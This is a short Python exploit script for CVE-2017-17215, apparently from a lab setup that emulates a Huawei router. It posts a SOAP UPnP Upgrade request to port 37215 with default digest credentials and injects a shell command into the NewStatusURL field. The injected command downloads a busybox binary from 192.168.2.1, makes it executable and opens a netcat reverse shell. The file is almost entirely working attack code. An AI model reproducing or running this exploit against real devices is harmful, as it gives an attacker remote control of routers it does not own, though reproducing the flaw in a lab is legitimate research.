HUAWEI/CVE-2017-17215/system-emu/tools/exp.py

#!/usr/bin/python
import threading, requests
from requests.auth import HTTPDigestAuth

cmd = "busybox wget -g 192.168.2.1 -P 8000 -l /tmp/busybox -r /tools/busybox-mips ; chmod +x /tmp/busybox ; /tmp/busybox nc 192.168.2.1 1234 -e /bin/sh"
data = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"

class exploit(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip)

    def run(self):
        try:
            print("cmd: " + cmd)
            url = "http://" + self.ip + ":37215/ctrlt/DeviceUpgrade_1"
            requests.post(url, timeout=5, auth=HTTPDigestAuth('dslf-config', 'admin'), data=data)
        except Exception as e:
            print(e)

n = exploit('192.168.2.2')
n.start()
